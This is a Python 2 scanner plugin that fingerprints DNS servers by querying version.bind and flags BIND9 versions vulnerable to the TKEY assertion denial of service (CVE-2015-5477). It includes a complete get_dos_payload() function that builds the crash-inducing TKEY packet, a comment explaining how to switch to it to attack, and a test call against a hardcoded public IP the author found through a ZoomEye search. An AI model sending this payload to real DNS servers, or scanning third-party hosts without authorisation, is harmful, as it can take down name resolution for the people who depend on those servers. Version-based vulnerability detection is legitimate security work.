#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Date    : 2015-08-05 17:34:49
# @Author  : Medici.Yan (Medici.Yan@gmail.com)
# @Link    : http://blog.evalbug.com
#
#DNS服务识别和Bind9 DOS检测，提供了dos脚本，只是没有调用，可能存在允许范围内的误报
import struct,socket,re

def assign(service, arg):
    if service == "ip":
        return True, arg
def audit(arg):
    host = arg
    port=53

    protocol = None
    version=None
    
    us=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    socket.setdefaulttimeout(5)
    try:
        #if want to attack change 
        #payload=get_dos_payload()
        payload=get_query_payload()
        us.sendto(payload,(host,port))
        data=us.recvfrom(1024)
        version=getVersion(data[0],payload)
        protocol='DNS'
        version=re.sub(r'[^a-zA-Z0-9.\-\_]', '', version)
        security_note('udp/53=>[%s];Ver =>%s'%(protocol,version))
        guessDos(version)
    except Exception, e:
        pass


def guessDos(version):
    #https://www.exploit-db.com/exploits/37721/
    #BIND 9.1.0~9.9.7-P1,
    #BIND 9.10.0~BIND 9.10.2-P2
    safe_matches=[r'9\.9\.7\-P2', r'9\.10\.2\-P3']
    hole_matches=[r'9\.9\.7\-P1', r'9\.10\.2\-P[12]', r'9\.10\.[0-2]', r'9\.[1-9]\.\d']
    warning_matches=[r'bind9',r'bind']
    for i in range(len(safe_matches)):
        safematch=re.search(safe_matches[i] , version, re.M|re.I)
        if safematch: #safe version
            return
    for i in range(len(hole_matches)):
        holematch=re.search(hole_matches[i] , version, re.M|re.I)
        if holematch:
            security_hole('Bind9 tkey assert dos.Version=>%s'%(version))
            return
    for i in range(len(warning_matches)) :
        warningmatche=re.search(warning_matches[i] , version ,re.M|re.I)
        if warningmatche:
            security_info('MayBe have=>Bind9 tkey assert dos.Version=>%s'%(version))
            return

def get_query_payload():
    TransactionID=0x0304
    Flags=0x0100 #0 0000 0 1 0 0
    Questions=1
    AnswerRRs=0
    AuthorityRRs=0
    AdditionalRRs=0
    queries_name='version.bind'
    queries_type=0x0010 #TXT
    queries_class=0x0003 #CH
    queries_name_temp=queries_name.split('.')
    queries=''
    for i in range(len(queries_name_temp)):
        queries+=struct.pack('!B'+str(len(queries_name_temp[i]))+'s',len(queries_name_temp[i]),queries_name_temp[i])
    queries+='\x00'
    queries+=struct.pack('!HH',queries_type,queries_class)
    payload=struct.pack('!HHHHHH', TransactionID, Flags,Questions,AnswerRRs,AuthorityRRs,AdditionalRRs)+queries
    return payload


def get_dos_payload():
    TransactionID=0x0102
    Flags=0x0100 #0 0000 0 1 0 0
    Questions=1
    AnswerRRs=0
    AuthorityRRs=0
    AdditionalRRs=1 #1
    #
    dns_header=struct.pack('!HHHHHH', TransactionID, Flags,Questions,AnswerRRs,AuthorityRRs,AdditionalRRs)
    #
    queries_name='foo.bar'
    queries_type=0x00f9 #TKEY
    queries_class=0x00ff #Any
    queries_name_temp=queries_name.split('.')
    queries=''
    for i in range(len(queries_name_temp)):
        queries+=struct.pack('!B'+str(len(queries_name_temp[i]))+'s',len(queries_name_temp[i]),queries_name_temp[i])
    queries+='\x00'
    queries+=struct.pack('!HH',queries_type,queries_class)
    #
    additional_name='foo.bar'
    additional_type=0x0010 #TXT
    additional_class=0x00ff #Any
    timetolive=0 #L
    txt='https://github.com/robertdavidgraham/cve-2015-5477'
    txt_length=len(txt)
    data_length=txt_length+1
    #
    addtional_name_temp=additional_name.split('.')
    additional=''
    for i in range(len(addtional_name_temp)):
        additional+=struct.pack('!B'+str(len(addtional_name_temp[i]))+'s',len(addtional_name_temp[i]),addtional_name_temp[i])
    additional+='\x00'
    additional+=struct.pack('!HHLHB'+str(txt_length)+'s',additional_type,additional_class,timetolive,data_length,txt_length,txt)
    #
    payload=dns_header+queries+additional
    return payload


def getVersion(data,payload):
    query_payload=payload
    ver=''
    if len(data)<12:
        return False
    if data[0:2]!=query_payload[0:2]:
        return False
    if (ord(data[2])&0x80)!=0x80:
        return False
    if (ord(data[3])&0x0F)!=0:
        return False
    
    i=12
    #skip query name
    while i<len(data):
        if ord(data[i])==0:
            i+=1
            break;
        elif (ord(data[i])&0xC0)==0xC0:
            i+=2
            break
        else:
            i+=ord(data[i])+1
    i+=4
    while (i+12<=len(data)):
        while i<len(data):
            if ord(data[i])==0:
                i+=1
                break
            elif (ord(data[i])&0xC0)==0xC0:
                i+=2
                break
            else:
                i+=ord(data[i])+1
        if i+10>len(data):
            break;
        t=ord(data[i+0])<<8|ord(data[i+1])
        c=ord(data[i+2])<<8|ord(data[i+3])
        l=ord(data[i+8])<<8|ord(data[i+9])
        i += 10;
        if t!=16 or c!=3:
            i+=l
            continue
        if l>len(data)-i:
            l=len(data)-i
        ver+=data[i:i+l]
    return ver


if __name__ == '__main__':
	from dummy import *
	audit(assign('ip','216.182.241.4')[1])
        #测试IP我是在Zoomeye上直接搜索 bind9 的